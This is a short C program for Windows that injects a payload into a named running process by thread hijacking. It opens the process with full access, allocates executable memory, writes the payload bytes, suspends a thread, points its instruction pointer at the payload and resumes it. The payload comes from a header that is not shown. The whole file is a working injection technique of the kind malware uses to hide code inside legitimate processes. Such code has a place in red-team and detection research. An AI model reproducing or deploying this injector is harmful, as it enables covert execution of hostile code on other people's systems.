#include"Functions.h"

int main(int ArgC, char* ArgV[]){
    if(ArgC != 2){
        printf("Enter the process name and the process name only.\n");
        return 0;
    }

    printf(" _______________ GENERAL INFO _________________  \n");
    HEADER1("Choosen Process");

    int PID = GetProcID(ArgV[1]);
    if(PID == -1) return 0;

    HANDLE thread = GetThreadHandle(PID);
    if(thread == NULL) return 0;



    HEADER1("Remote Process Work");
    HANDLE rProc = OpenProcess(PROCESS_ALL_ACCESS,false,PID);
    HEADER2("Process %s Opened with Handle 0x%x",ArgV[1],rProc);

    LPVOID EXE = VirtualAllocEx(rProc,NULL,payloadSize, MEM_COMMIT | MEM_RESERVE , PAGE_EXECUTE_READWRITE);
    size_t written =0;
    WriteProcessMemory(rProc,EXE,payload,payloadSize,&written);
    HEADER2("%d Payload bytes were written at 0x%p\n",written,EXE);


    HEADER1("Thead Hijacking");
    SuspendThread(thread);
    HEADER2("Thread Suspended .... ");

    CONTEXT ChoosenThreadContext;
    ChoosenThreadContext.ContextFlags = CONTEXT_FULL;

    GetThreadContext(thread,&ChoosenThreadContext);
    HEADER2("Full Context Obtained ... ");

    ChoosenThreadContext.Rip =(DWORD_PTR)EXE;
    SetThreadContext(thread,&ChoosenThreadContext);
    HEADER2("Context RIP changed");

    ResumeThread(thread);
    HEADER2("Thread Resumed ... ");

}
